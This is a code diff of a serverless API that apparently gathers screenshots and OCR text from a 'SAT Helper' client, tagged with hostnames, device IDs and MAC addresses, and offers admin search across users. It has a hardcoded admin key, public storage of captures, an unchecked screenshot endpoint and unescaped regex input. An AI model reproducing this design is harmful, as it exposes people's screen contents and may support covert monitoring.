@@ -1,4 +1,4 @@
-// api/clipboard.js - Screenshot Clipboard Management API with OCR Text Extraction
+// api/clipboard.js - Enhanced Screenshot Clipboard Management API with OCR Support
 import { put, del, list } from '@vercel/blob';
 
 // Hardcoded admin key for clipboard access
@@ -17,83 +17,17 @@ function validateAdminAccess(req) {
     return adminKey === ADMIN_SECRET_KEY;
 }
 
-// Generate unique screenshot ID
-function generateScreenshotId() {
+// Generate unique screenshot/OCR ID
+function generateId() {
     return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
-}
-
-// OCR Text Extraction using Google Cloud Vision API
-async function extractTextFromImage(imageBuffer) {
-    try {
-        // Using Google Cloud Vision API
-        const visionApiKey = process.env.GOOGLE_VISION_API_KEY;
-        if (!visionApiKey) {
-            console.warn('Google Vision API key not found, skipping OCR');
-            return { text: '', confidence: 0 };
-        }
-
-        const base64Image = imageBuffer.toString('base64');
-        
-        const response = await fetch(`https://vision.googleapis.com/v1/images:annotate?key=${visionApiKey}`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                requests: [{
-                    image: {
-                        content: base64Image
-                    },
-                    features: [{
-                        type: 'TEXT_DETECTION',
-                        maxResults: 1
-                    }]
-                }]
-            })
-        });
-
-        if (!response.ok) {
-            throw new Error(`Vision API error: ${response.status}`);
-        }
-
-        const result = await response.json();
-        
-        if (result.responses && result.responses[0] && result.responses[0].textAnnotations) {
-            const textAnnotation = result.responses[0].textAnnotations[0];
-            return {
-                text: textAnnotation.description || '',
-                confidence: textAnnotation.confidence || 0,
-                boundingPoly: textAnnotation.boundingPoly
-            };
-        }
-
-        return { text: '', confidence: 0 };
-        
-    } catch (error) {
-        console.error('OCR extraction failed:', error);
-        return { text: '', confidence: 0, error: error.message };
-    }
-}
-
-// Alternative OCR using Tesseract.js (fallback)
-async function extractTextWithTesseract(imageBuffer) {
-    try {
-        // This would require Tesseract.js to be available
-        // For serverless functions, we'll use a simpler approach
-        console.log('Tesseract OCR not implemented in serverless environment');
-        return { text: '', confidence: 0 };
-    } catch (error) {
-        console.error('Tesseract OCR failed:', error);
-        return { text: '', confidence: 0, error: error.message };
-    }
 }
 
 // In-memory storage for clipboard index with OCR data
 let clipboardIndex = {
     users: {},
     totalScreenshots: 0,
-    lastUpdated: null,
-    totalTextExtracted: 0
+    totalOcrEntries: 0,
+    lastUpdated: null
 };
 
 export default async function handler(req, res) {
@@ -112,16 +46,22 @@ export default async function handler(req, res) {
         switch (action) {
             case 'upload-screenshot':
                 return await handleScreenshotUpload(req, res);
+            case 'upload-ocr':
+                return await handleOcrUpload(req, res);
             case 'list-users':
                 return await handleListUsers(req, res);
             case 'get-user-screenshots':
                 return await handleGetUserScreenshots(req, res);
-            case 'get-screenshot-text':
-                return await handleGetScreenshotText(req, res);
+            case 'get-user-ocr':
+                return await handleGetUserOcr(req, res);
+            case 'get-screenshot':
+                return await handleGetScreenshot(req, res);
             case 'search-text':
                 return await handleSearchText(req, res);
             case 'delete-screenshot':
                 return await handleDeleteScreenshot(req, res);
+            case 'delete-ocr':
+                return await handleDeleteOcr(req, res);
             case 'clear-user-clipboard':
                 return await handleClearUserClipboard(req, res);
             case 'get-stats':
@@ -131,7 +71,7 @@ export default async function handler(req, res) {
             default:
                 return res.status(400).json({
                     success: false,
-                    message: 'Invalid action. Available: upload-screenshot, list-users, get-user-screenshots, get-screenshot-text, search-text, delete-screenshot, clear-user-clipboard, get-stats, health'
+                    message: 'Invalid action. Available: upload-screenshot, upload-ocr, list-users, get-user-screenshots, get-user-ocr, get-screenshot, search-text, delete-screenshot, delete-ocr, clear-user-clipboard, get-stats, health'
                 });
         }
     } catch (error) {
@@ -144,7 +84,119 @@ export default async function handler(req, res) {
     }
 }
 
-// Handle screenshot upload with OCR text extraction
+// Handle OCR JSON data upload from SAT Helper
+async function handleOcrUpload(req, res) {
+    const ocrData = req.body;
+
+    if (!ocrData || !ocrData.metadata || !ocrData.ocr) {
+        return res.status(400).json({
+            success: false,
+            message: 'Invalid OCR data structure. Expected metadata and ocr fields.'
+        });
+    }
+
+    try {
+        const { metadata, ocr, stats } = ocrData;
+        const userId = metadata.user || metadata.deviceId || 'unknown';
+        const ocrId = generateId();
+        
+        console.log(`Processing OCR data from user ${userId}`);
+        console.log(`Text length: ${ocr.text?.length || 0}, Method: ${ocr.method}, Confidence: ${ocr.confidence}`);
+
+        // Store OCR JSON data in Blob
+        const fileName = `ocr/${userId}/${ocrId}.json`;
+        const blob = await put(fileName, JSON.stringify(ocrData, null, 2), {
+            access: 'public',
+            contentType: 'application/json',
+        });
+
+        // Update in-memory clipboard index
+        if (!clipboardIndex.users[userId]) {
+            clipboardIndex.users[userId] = {
+                username: metadata.user || userId,
+                deviceInfo: {
+                    hostname: metadata.hostname || 'Unknown',
+                    platform: metadata.platform || 'Unknown',
+                    deviceId: metadata.deviceId || 'Unknown',
+                    accessType: metadata.accessType || 'Unknown'
+                },
+                screenshots: [],
+                ocrEntries: [],
+                firstSeen: new Date().toISOString(),
+                lastActive: new Date().toISOString(),
+                totalScreenshots: 0,
+                totalOcrEntries: 0
+            };
+        }
+
+        // Add OCR entry to user's data
+        const ocrEntry = {
+            id: ocrId,
+            filename: fileName,
+            timestamp: metadata.timestamp || Date.now(),
+            uploadedAt: new Date().toISOString(),
+            screenshotPath: metadata.screenshotPath,
+            screenshotFileName: metadata.screenshotFileName,
+            extractedText: ocr.text || '',
+            textConfidence: ocr.confidence || 0,
+            wordCount: ocr.wordCount || 0,
+            characterCount: ocr.characterCount || 0,
+            hasText: ocr.hasText || false,
+            method: ocr.method || 'unknown',
+            sessionStats: stats || {},
+            blobUrl: blob.url,
+            size: JSON.stringify(ocrData).length
+        };
+
+        clipboardIndex.users[userId].ocrEntries.unshift(ocrEntry); // Add to beginning
+        clipboardIndex.users[userId].lastActive = new Date().toISOString();
+        clipboardIndex.users[userId].totalOcrEntries++;
+
+        // Keep only last 100 OCR entries per user
+        if (clipboardIndex.users[userId].ocrEntries.length > 100) {
+            const oldEntries = clipboardIndex.users[userId].ocrEntries.splice(100);
+            
+            // Delete old files from Blob
+            for (const oldEntry of oldEntries) {
+                try {
+                    await del(oldEntry.blobUrl);
+                } catch (error) {
+                    console.log(`Could not delete old OCR file: ${oldEntry.filename}`);
+                }
+            }
+        }
+
+        clipboardIndex.totalOcrEntries++;
+        clipboardIndex.lastUpdated = new Date().toISOString();
+
+        console.log(`OCR data processed successfully: ${ocrId} for user ${userId}`);
+
+        return res.status(200).json({
+            success: true,
+            message: 'OCR data uploaded successfully',
+            data: {
+                ocrId: ocrId,
+                userId: userId,
+                blobUrl: blob.url,
+                extractedText: ocr.text,
+                wordCount: ocr.wordCount,
+                hasText: ocr.hasText,
+                method: ocr.method,
+                confidence: ocr.confidence
+            }
+        });
+
+    } catch (error) {
+        console.error('OCR upload error:', error);
+        return res.status(500).json({
+            success: false,
+            message: 'Failed to upload OCR data',
+            error: error.message
+        });
+    }
+}
+
+// Handle regular screenshot upload (legacy support)
 async function handleScreenshotUpload(req, res) {
     const { 
         userId, 
@@ -156,8 +208,7 @@ async function handleScreenshotUpload(req, res) {
         timestamp, 
         macAddresses, 
         imageData,
-        sessionInfo,
-        extractText = true // Option to enable/disable OCR
+        sessionInfo
     } = req.body;
 
     if (!userId || !imageData || !username) {
@@ -168,37 +219,19 @@ async function handleScreenshotUpload(req, res) {
     }
 
     try {
-        const screenshotId = generateScreenshotId();
+        const screenshotId = generateId();
         
         // Convert base64 to buffer
         const imageBuffer = Buffer.from(imageData, 'base64');
         
         console.log(`Processing screenshot ${screenshotId} for user ${userId}`);
         
-        // Extract text from image using OCR
-        let ocrResult = { text: '', confidence: 0 };
-        if (extractText) {
-            console.log('Starting OCR text extraction...');
-            ocrResult = await extractTextFromImage(imageBuffer);
-            console.log(`OCR completed. Text length: ${ocrResult.text.length}, Confidence: ${ocrResult.confidence}`);
-        }
-        
-        // Upload original image to Vercel Blob
+        // Upload image to Vercel Blob
         const fileName = `screenshots/${userId}/${screenshotId}.png`;
         const blob = await put(fileName, imageBuffer, {
             access: 'public',
             contentType: 'image/png',
         });
-        
-        // Also store extracted text as a separate file
-        if (ocrResult.text) {
-            const textFileName = `text/${userId}/${screenshotId}.txt`;
-            const textBlob = await put(textFileName, ocrResult.text, {
-                access: 'public',
-                contentType: 'text/plain',
-            });
-            console.log(`Text extracted and stored: ${textBlob.url}`);
-        }
 
         // Update in-memory clipboard index
         if (!clipboardIndex.users[userId]) {
@@ -211,14 +244,15 @@ async function handleScreenshotUpload(req, res) {
                     macAddresses: macAddresses
                 },
                 screenshots: [],
+                ocrEntries: [],
                 firstSeen: new Date().toISOString(),
                 lastActive: new Date().toISOString(),
                 totalScreenshots: 0,
-                totalTextExtracted: 0
+                totalOcrEntries: 0
             };
         }
 
-        // Add screenshot with OCR data to user's clipboard
+        // Add screenshot to user's clipboard
         const screenshotEntry = {
             id: screenshotId,
             filename: fileName,
@@ -227,41 +261,23 @@ async function handleScreenshotUpload(req, res) {
             accessType: accessType,
             sessionInfo: sessionInfo || {},
             size: imageBuffer.length,
-            blobUrl: blob.url,
-            // OCR data
-            extractedText: ocrResult.text || '',
-            textConfidence: ocrResult.confidence || 0,
-            textWordCount: ocrResult.text ? ocrResult.text.split(/\s+/).length : 0,
-            hasText: Boolean(ocrResult.text),
-            ocrError: ocrResult.error || null
+            blobUrl: blob.url
         };
 
-        clipboardIndex.users[userId].screenshots.push(screenshotEntry);
+        clipboardIndex.users[userId].screenshots.unshift(screenshotEntry);
         clipboardIndex.users[userId].lastActive = new Date().toISOString();
         clipboardIndex.users[userId].totalScreenshots++;
         
-        if (ocrResult.text) {
-            clipboardIndex.users[userId].totalTextExtracted++;
-            clipboardIndex.totalTextExtracted++;
-        }
-        
-        // Keep only last 50 screenshots per user to manage storage
+        // Keep only last 50 screenshots per user
         if (clipboardIndex.users[userId].screenshots.length > 50) {
-            const oldScreenshots = clipboardIndex.users[userId].screenshots.splice(0, clipboardIndex.users[userId].screenshots.length - 50);
+            const oldScreenshots = clipboardIndex.users[userId].screenshots.splice(50);
             
             // Delete old files from Blob
             for (const oldScreenshot of oldScreenshots) {
                 try {
                     await del(oldScreenshot.blobUrl);
-                    // Also delete text file if it exists
-                    const oldTextFileName = `text/${userId}/${oldScreenshot.id}.txt`;
-                    try {
-                        await del(oldTextFileName);
-                    } catch (e) {
-                        // Text file might not exist
-                    }
                 } catch (error) {
-                    console.log(`Could not delete old files: ${oldScreenshot.filename}`);
+                    console.log(`Could not delete old screenshot: ${oldScreenshot.filename}`);
                 }
             }
         }
@@ -273,130 +289,135 @@ async function handleScreenshotUpload(req, res) {
 
         return res.status(200).json({
             success: true,
-            message: 'Screenshot uploaded and processed successfully',
+            message: 'Screenshot uploaded successfully',
             data: {
                 screenshotId: screenshotId,
                 userId: userId,
-                blobUrl: blob.url,
-                extractedText: ocrResult.text,
-                textConfidence: ocrResult.confidence,
-                wordCount: ocrResult.text ? ocrResult.text.split(/\s+/).length : 0,
-                hasText: Boolean(ocrResult.text),
-                textPreview: ocrResult.text ? ocrResult.text.substring(0, 100) + (ocrResult.text.length > 100 ? '...' : '') : null
+                blobUrl: blob.url
             }
         });
 
     } catch (error) {
-        console.error('Upload error:', error);
+        console.error('Screenshot upload error:', error);
         return res.status(500).json({
             success: false,
-            message: 'Failed to upload and process screenshot',
+            message: 'Failed to upload screenshot',
             error: error.message
         });
     }
 }
 
-// Sync in-memory data with blob storage (enhanced for OCR)
-async function syncUserDataFromBlobs() {
+// Sync in-memory data with blob storage
+async function syncDataFromBlobs() {
     try {
         const { blobs } = await list();
         
-        // Extract unique user IDs from screenshot blob paths
+        // Extract unique user IDs from blob paths
         const userIds = [...new Set(
             blobs
-                .filter(blob => blob.pathname.startsWith('screenshots/'))
+                .filter(blob => blob.pathname.startsWith('screenshots/') || blob.pathname.startsWith('ocr/'))
                 .map(blob => blob.pathname.split('/')[1])
                 .filter(userId => userId && userId !== '')
         )];
 
         // Sync each user's data
         for (const userId of userIds) {
-            const userBlobs = blobs.filter(blob => 
+            const userScreenshotBlobs = blobs.filter(blob => 
                 blob.pathname.startsWith(`screenshots/${userId}/`)
             );
             
-            const userTextBlobs = blobs.filter(blob => 
-                blob.pathname.startsWith(`text/${userId}/`)
+            const userOcrBlobs = blobs.filter(blob => 
+                blob.pathname.startsWith(`ocr/${userId}/`)
             );
 
             // If user doesn't exist in memory, create them
             if (!clipboardIndex.users[userId]) {
                 clipboardIndex.users[userId] = {
-                    username: userId, // fallback
+                    username: userId,
                     deviceInfo: {},
                     screenshots: [],
-                    firstSeen: userBlobs.length > 0 ? userBlobs[userBlobs.length - 1].uploadedAt : new Date().toISOString(),
-                    lastActive: userBlobs.length > 0 ? userBlobs[0].uploadedAt : new Date().toISOString(),
-                    totalScreenshots: userBlobs.length,
-                    totalTextExtracted: userTextBlobs.length
+                    ocrEntries: [],
+                    firstSeen: new Date().toISOString(),
+                    lastActive: new Date().toISOString(),
+                    totalScreenshots: userScreenshotBlobs.length,
+                    totalOcrEntries: userOcrBlobs.length
                 };
             }
 
-            // Sync screenshots from blobs to memory
-            clipboardIndex.users[userId].screenshots = await Promise.all(
-                userBlobs
+            // Sync screenshots
+            clipboardIndex.users[userId].screenshots = userScreenshotBlobs
+                .sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt))
+                .map((blob) => {
+                    const fileName = blob.pathname.split('/').pop();
+                    const screenshotId = fileName.replace('.png', '');
+                    
+                    return {
+                        id: screenshotId,
+                        filename: blob.pathname,
+                        timestamp: new Date(blob.uploadedAt).getTime(),
+                        uploadedAt: blob.uploadedAt,
+                        accessType: 'Unknown',
+                        sessionInfo: {},
+                        size: blob.size,
+                        blobUrl: blob.url
+                    };
+                });
+
+            // Sync OCR entries
+            clipboardIndex.users[userId].ocrEntries = await Promise.all(
+                userOcrBlobs
                     .sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt))
                     .map(async (blob) => {
                         const fileName = blob.pathname.split('/').pop();
-                        const screenshotId = fileName.replace('.png', '');
+                        const ocrId = fileName.replace('.json', '');
                         
-                        // Check if there's extracted text for this screenshot
-                        const textBlob = userTextBlobs.find(tb => 
-                            tb.pathname === `text/${userId}/${screenshotId}.txt`
-                        );
-                        
-                        let extractedText = '';
-                        if (textBlob) {
-                            try {
-                                const textResponse = await fetch(textBlob.url);
-                                if (textResponse.ok) {
-                                    extractedText = await textResponse.text();
-                                }
-                            } catch (e) {
-                                console.log(`Could not fetch text for ${screenshotId}`);
+                        // Try to fetch OCR data for text preview
+                        let ocrPreview = {};
+                        try {
+                            const response = await fetch(blob.url);
+                            if (response.ok) {
+                                const ocrData = await response.json();
+                                ocrPreview = {
+                                    extractedText: ocrData.ocr?.text || '',
+                                    wordCount: ocrData.ocr?.wordCount || 0,
+                                    hasText: ocrData.ocr?.hasText || false,
+                                    method: ocrData.ocr?.method || 'unknown',
+                                    confidence: ocrData.ocr?.confidence || 0
+                                };
                             }
+                        } catch (e) {
+                            console.log(`Could not fetch OCR data for ${ocrId}`);
                         }
                         
                         return {
-                            id: screenshotId,
+                            id: ocrId,
                             filename: blob.pathname,
                             timestamp: new Date(blob.uploadedAt).getTime(),
                             uploadedAt: blob.uploadedAt,
-                            accessType: 'Unknown',
-                            sessionInfo: {},
                             size: blob.size,
                             blobUrl: blob.url,
-                            extractedText: extractedText,
-                            textConfidence: extractedText ? 0.8 : 0, // Fallback confidence
-                            textWordCount: extractedText ? extractedText.split(/\s+/).length : 0,
-                            hasText: Boolean(extractedText)
+                            ...ocrPreview
                         };
                     })
             );
 
-            clipboardIndex.users[userId].totalScreenshots = userBlobs.length;
-            clipboardIndex.users[userId].totalTextExtracted = userTextBlobs.length;
+            clipboardIndex.users[userId].totalScreenshots = userScreenshotBlobs.length;
+            clipboardIndex.users[userId].totalOcrEntries = userOcrBlobs.length;
         }
 
         clipboardIndex.totalScreenshots = blobs.filter(blob => blob.pathname.startsWith('screenshots/')).length;
-        clipboardIndex.totalTextExtracted = blobs.filter(blob => blob.pathname.startsWith('text/')).length;
+        clipboardIndex.totalOcrEntries = blobs.filter(blob => blob.pathname.startsWith('ocr/')).length;
         clipboardIndex.lastUpdated = new Date().toISOString();
 
     } catch (error) {
-        console.error('Error syncing user data from blobs:', error);
+        console.error('Error syncing data from blobs:', error);
     }
 }
 
-// Get extracted text for a specific screenshot
-async function handleGetScreenshotText(req, res) {
-    if (!validateClipboardAccess(req)) {
-        return res.status(403).json({
-            success: false,
-            message: 'Clipboard access denied. Correct admin key required.'
-        });
-    }
-
+// Get screenshot file
+async function handleGetScreenshot(req, res) {
     const { screenshotId, userId } = req.query;
+    
     if (!screenshotId || !userId) {
         return res.status(400).json({
             success: false,
@@ -405,7 +426,7 @@ async function handleGetScreenshotText(req, res) {
     }
 
     try {
-        await syncUserDataFromBlobs();
+        await syncDataFromBlobs();
 
         if (!clipboardIndex.users[userId]) {
             return res.status(404).json({
@@ -423,25 +444,68 @@ async function handleGetScreenshotText(req, res) {
             });
         }
 
+        // Redirect to the blob URL
+        return res.redirect(screenshot.blobUrl);
+    } catch (error) {
+        console.error('Error fetching screenshot:', error);
+        return res.status(500).json({
+            success: false,
+            message: 'Failed to retrieve screenshot',
+            error: error.message
+        });
+    }
+}
+
+// Get user OCR entries
+async function handleGetUserOcr(req, res) {
+    if (!validateClipboardAccess(req)) {
+        return res.status(403).json({
+            success: false,
+            message: 'Clipboard access denied. Correct admin key required.'
+        });
+    }
+
+    const { userId } = req.query;
+    if (!userId) {
+        return res.status(400).json({
+            success: false,
+            message: 'userId parameter required'
+        });
+    }
+
+    try {
+        await syncDataFromBlobs();
+
+        if (!clipboardIndex.users[userId]) {
+            return res.status(404).json({
+                success: false,
+                message: 'User not found'
+            });
+        }
+
+        const userData = clipboardIndex.users[userId];
+
         return res.status(200).json({
             success: true,
-            message: 'Screenshot text retrieved successfully',
+            message: 'User OCR data retrieved successfully',
             data: {
-                screenshotId: screenshotId,
                 userId: userId,
-                extractedText: screenshot.extractedText || '',
-                textConfidence: screenshot.textConfidence || 0,
-                wordCount: screenshot.textWordCount || 0,
-                hasText: screenshot.hasText || false,
-                uploadedAt: screenshot.uploadedAt,
-                size: screenshot.size
+                username: userData.username,
+                deviceInfo: userData.deviceInfo,
+                ocrEntries: userData.ocrEntries.map(entry => ({
+                    ...entry,
+                    textPreview: entry.extractedText ? 
+                        entry.extractedText.substring(0, 200) + 
+                        (entry.extractedText.length > 200 ? '...' : '') : null
+                })),
+                totalOcrEntries: userData.ocrEntries.length
             }
         });
     } catch (error) {
-        console.error('Error fetching screenshot text:', error);
+        console.error('Error fetching user OCR data:', error);
         return res.status(500).json({
             success: false,
-            message: 'Failed to retrieve screenshot text',
+            message: 'Failed to retrieve user OCR data',
             error: error.message
         });
     }
@@ -465,7 +529,7 @@ async function handleSearchText(req, res) {
     }
 
     try {
-        await syncUserDataFromBlobs();
+        await syncDataFromBlobs();
 
         let searchResults = [];
         const searchTerm = searchQuery.toLowerCase();
@@ -476,29 +540,26 @@ async function handleSearchText(req, res) {
         for (const uId of usersToSearch) {
             if (!clipboardIndex.users[uId]) continue;
 
-            const userScreenshots = clipboardIndex.users[uId].screenshots.filter(screenshot => {
-                return screenshot.extractedText && 
-                       screenshot.extractedText.toLowerCase().includes(searchTerm);
+            const userOcrEntries = clipboardIndex.users[uId].ocrEntries.filter(entry => {
+                return entry.extractedText && 
+                       entry.extractedText.toLowerCase().includes(searchTerm);
             });
 
-            searchResults.push(...userScreenshots.map(screenshot => ({
-                ...screenshot,
+            searchResults.push(...userOcrEntries.map(entry => ({
+                ...entry,
                 userId: uId,
                 username: clipboardIndex.users[uId].username,
-                matchHighlight: getTextHighlight(screenshot.extractedText, searchTerm)
+                matchHighlight: getTextHighlight(entry.extractedText, searchTerm),
+                matchCount: (entry.extractedText.toLowerCase().match(new RegExp(searchTerm, 'g')) || []).length
             })));
         }
 
         // Sort by relevance (more matches = higher relevance)
-        searchResults.sort((a, b) => {
-            const aMatches = (a.extractedText.toLowerCase().match(new RegExp(searchTerm, 'g')) || []).length;
-            const bMatches = (b.extractedText.toLowerCase().match(new RegExp(searchTerm, 'g')) || []).length;
-            return bMatches - aMatches;
-        });
+        searchResults.sort((a, b) => b.matchCount - a.matchCount);
 
         return res.status(200).json({
             success: true,
-            message: `Found ${searchResults.length} screenshots containing "${searchQuery}"`,
+            message: `Found ${searchResults.length} OCR entries containing "${searchQuery}"`,
             data: {
                 searchQuery: searchQuery,
                 results: searchResults,
@@ -517,7 +578,7 @@ async function handleSearchText(req, res) {
 }
 
 // Helper function to highlight search matches
-function getTextHighlight(text, searchTerm, contextLength = 100) {
+function getTextHighlight(text, searchTerm, contextLength = 150) {
     if (!text || !searchTerm) return '';
     
     const index = text.toLowerCase().indexOf(searchTerm.toLowerCase());
@@ -529,7 +590,7 @@ function getTextHighlight(text, searchTerm, contextLength = 100) {
     return text.substring(start, end);
 }
 
-// Enhanced list users with OCR stats
+// List users with enhanced stats
 async function handleListUsers(req, res) {
     if (!validateClipboardAccess(req)) {
         return res.status(403).json({
@@ -539,20 +600,18 @@ async function handleListUsers(req, res) {
     }
 
     try {
-        await syncUserDataFromBlobs();
+        await syncDataFromBlobs();
 
         const userList = Object.entries(clipboardIndex.users).map(([userId, userData]) => ({
             userId: userId,
             username: userData.username,
             deviceInfo: userData.deviceInfo,
             totalScreenshots: userData.screenshots.length,
-            totalTextExtracted: userData.totalTextExtracted || 0,
-            textExtractionRate: userData.screenshots.length > 0 ? 
-                ((userData.totalTextExtracted || 0) / userData.screenshots.length * 100).toFixed(1) + '%' : '0%',
+            totalOcrEntries: userData.ocrEntries.length,
             firstSeen: userData.firstSeen,
             lastActive: userData.lastActive,
-            latestScreenshot: userData.screenshots.length > 0 ? 
-                userData.screenshots[0].uploadedAt : null
+            latestScreenshot: userData.screenshots.length > 0 ? userData.screenshots[0].uploadedAt : null,
+            latestOcrEntry: userData.ocrEntries.length > 0 ? userData.ocrEntries[0].uploadedAt : null
         }));
 
         return res.status(200).json({
@@ -562,9 +621,7 @@ async function handleListUsers(req, res) {
                 users: userList,
                 totalUsers: userList.length,
                 totalScreenshots: clipboardIndex.totalScreenshots,
-                totalTextExtracted: clipboardIndex.totalTextExtracted,
-                overallTextExtractionRate: clipboardIndex.totalScreenshots > 0 ?
-                    ((clipboardIndex.totalTextExtracted / clipboardIndex.totalScreenshots) * 100).toFixed(1) + '%' : '0%'
+                totalOcrEntries: clipboardIndex.totalOcrEntries
             }
         });
     } catch (error) {
@@ -577,7 +634,7 @@ async function handleListUsers(req, res) {
     }
 }
 
-// Enhanced get user screenshots with text data
+// Get user screenshots
 async function handleGetUserScreenshots(req, res) {
     if (!validateClipboardAccess(req)) {
         return res.status(403).json({
@@ -595,7 +652,7 @@ async function handleGetUserScreenshots(req, res) {
     }
 
     try {
-        await syncUserDataFromBlobs();
+        await syncDataFromBlobs();
 
         if (!clipboardIndex.users[userId]) {
             return res.status(404).json({
@@ -613,16 +670,8 @@ async function handleGetUserScreenshots(req, res) {
                 userId: userId,
                 username: userData.username,
                 deviceInfo: userData.deviceInfo,
-                screenshots: userData.screenshots.map(screenshot => ({
-                    ...screenshot,
-                    textPreview: screenshot.extractedText ? 
-                        screenshot.extractedText.substring(0, 100) + 
-                        (screenshot.extractedText.length > 100 ? '...' : '') : null
-                })),
-                totalScreenshots: userData.screenshots.length,
-                totalTextExtracted: userData.totalTextExtracted || 0,
-                textExtractionRate: userData.screenshots.length > 0 ? 
-                    ((userData.totalTextExtracted || 0) / userData.screenshots.length * 100).toFixed(1) + '%' : '0%'
+                screenshots: userData.screenshots,
+                totalScreenshots: userData.screenshots.length
             }
         });
     } catch (error) {
@@ -635,7 +684,7 @@ async function handleGetUserScreenshots(req, res) {
     }
 }
 
-// Delete specific screenshot (enhanced to also delete text files)
+// Delete specific screenshot
 async function handleDeleteScreenshot(req, res) {
     if (!validateClipboardAccess(req)) {
         return res.status(403).json({
@@ -653,7 +702,7 @@ async function handleDeleteScreenshot(req, res) {
     }
 
     try {
-        await syncUserDataFromBlobs();
+        await syncDataFromBlobs();
 
         if (!clipboardIndex.users[userId]) {
             return res.status(404).json({
@@ -676,22 +725,8 @@ async function handleDeleteScreenshot(req, res) {
         // Delete from Blob storage
         try {
             await del(screenshot.blobUrl);
-            
-            // Also delete text file if it exists
-            const textFileName = `text/${userId}/${screenshotId}.txt`;
-            try {
-                await del(textFileName);
-            } catch (e) {
-                // Text file might not exist, that's okay
-            }
         } catch (error) {
-            console.log(`Could not delete screenshot files: ${screenshot.filename}`);
-        }
-
-        // Update counters
-        if (screenshot.hasText) {
-            clipboardIndex.users[userId].totalTextExtracted--;
-            clipboardIndex.totalTextExtracted--;
+            console.log(`Could not delete screenshot: ${screenshot.filename}`);
         }
 
         // Remove from index
@@ -702,7 +737,7 @@ async function handleDeleteScreenshot(req, res) {
 
         return res.status(200).json({
             success: true,
-            message: 'Screenshot and associated text deleted successfully'
+            message: 'Screenshot deleted successfully'
         });
 
     } catch (error) {
@@ -715,7 +750,73 @@ async function handleDeleteScreenshot(req, res) {
     }
 }
 
-// Clear all screenshots for a user (enhanced for text files)
+// Delete specific OCR entry
+async function handleDeleteOcr(req, res) {
+    if (!validateClipboardAccess(req)) {
+        return res.status(403).json({
+            success: false,
+            message: 'Clipboard access denied. Correct admin key required.'
+        });
+    }
+
+    const { ocrId, userId } = req.method === 'DELETE' ? req.query : req.body;
+    if (!ocrId || !userId) {
+        return res.status(400).json({
+            success: false,
+            message: 'ocrId and userId required'
+        });
+    }
+
+    try {
+        await syncDataFromBlobs();
+
+        if (!clipboardIndex.users[userId]) {
+            return res.status(404).json({
+                success: false,
+                message: 'User not found'
+            });
+        }
+
+        const ocrIndex = clipboardIndex.users[userId].ocrEntries.findIndex(o => o.id === ocrId);
+        
+        if (ocrIndex === -1) {
+            return res.status(404).json({
+                success: false,
+                message: 'OCR entry not found'
+            });
+        }
+
+        const ocrEntry = clipboardIndex.users[userId].ocrEntries[ocrIndex];
+        
+        // Delete from Blob storage
+        try {
+            await del(ocrEntry.blobUrl);
+        } catch (error) {
+            console.log(`Could not delete OCR entry: ${ocrEntry.filename}`);
+        }
+
+        // Remove from index
+        clipboardIndex.users[userId].ocrEntries.splice(ocrIndex, 1);
+        clipboardIndex.users[userId].totalOcrEntries--;
+        clipboardIndex.totalOcrEntries--;
+        clipboardIndex.lastUpdated = new Date().toISOString();
+
+        return res.status(200).json({
+            success: true,
+            message: 'OCR entry deleted successfully'
+        });
+
+    } catch (error) {
+        console.error('Error deleting OCR entry:', error);
+        return res.status(500).json({
+            success: false,
+            message: 'Failed to delete OCR entry',
+            error: error.message
+        });
+    }
+}
+
+// Clear all data for a user
 async function handleClearUserClipboard(req, res) {
     if (!validateClipboardAccess(req)) {
         return res.status(403).json({
@@ -733,7 +834,7 @@ async function handleClearUserClipboard(req, res) {
     }
 
     try {
-        await syncUserDataFromBlobs();
+        await syncDataFromBlobs();
 
         if (!clipboardIndex.users[userId]) {
             return res.status(404).json({
@@ -743,37 +844,37 @@ async function handleClearUserClipboard(req, res) {
         }
 
         const screenshots = clipboardIndex.users[userId].screenshots;
-        const screenshotCount = screenshots.length;
-        const textCount = clipboardIndex.users[userId].totalTextExtracted || 0;
+        const ocrEntries = clipboardIndex.users[userId].ocrEntries;
         
         // Delete all files from Blob for this user
         for (const screenshot of screenshots) {
             try {
                 await del(screenshot.blobUrl);
-                
-                // Also delete text file
-                const textFileName = `text/${userId}/${screenshot.id}.txt`;
-                try {
-                    await del(textFileName);
-                } catch (e) {
-                    // Text file might not exist
-                }
             } catch (error) {
-                console.log(`Could not delete files: ${screenshot.filename}`);
+                console.log(`Could not delete screenshot: ${screenshot.filename}`);
+            }
+        }
+        
+        for (const ocrEntry of ocrEntries) {
+            try {
+                await del(ocrEntry.blobUrl);
+            } catch (error) {
+                console.log(`Could not delete OCR entry: ${ocrEntry.filename}`);
             }
         }
 
         // Update counters
-        clipboardIndex.totalScreenshots -= screenshotCount;
-        clipboardIndex.totalTextExtracted -= textCount;
+        clipboardIndex.totalScreenshots -= screenshots.length;
+        clipboardIndex.totalOcrEntries -= ocrEntries.length;
         clipboardIndex.users[userId].screenshots = [];
+        clipboardIndex.users[userId].ocrEntries = [];
         clipboardIndex.users[userId].totalScreenshots = 0;
-        clipboardIndex.users[userId].totalTextExtracted = 0;
+        clipboardIndex.users[userId].totalOcrEntries = 0;
         clipboardIndex.lastUpdated = new Date().toISOString();
 
         return res.status(200).json({
             success: true,
-            message: `Cleared ${screenshotCount} screenshots and ${textCount} text extractions for user ${userId}`
+            message: `Cleared ${screenshots.length} screenshots and ${ocrEntries.length} OCR entries for user ${userId}`
         });
 
     } catch (error) {
@@ -786,7 +887,7 @@ async function handleClearUserClipboard(req, res) {
     }
 }
 
-// Get enhanced statistics with OCR data
+// Get statistics
 async function handleGetStats(req, res) {
     if (!validateClipboardAccess(req)) {
         return res.status(403).json({
@@ -796,22 +897,18 @@ async function handleGetStats(req, res) {
     }
 
     try {
-        await syncUserDataFromBlobs();
+        await syncDataFromBlobs();
 
         const stats = {
             totalUsers: Object.keys(clipboardIndex.users).length,
             totalScreenshots: clipboardIndex.totalScreenshots,
-            totalTextExtracted: clipboardIndex.totalTextExtracted,
-            textExtractionRate: clipboardIndex.totalScreenshots > 0 ? 
-                ((clipboardIndex.totalTextExtracted / clipboardIndex.totalScreenshots) * 100).toFixed(1) + '%' : '0%',
+            totalOcrEntries: clipboardIndex.totalOcrEntries,
             lastUpdated: clipboardIndex.lastUpdated,
             userStats: Object.entries(clipboardIndex.users).map(([userId, userData]) => ({
                 userId,
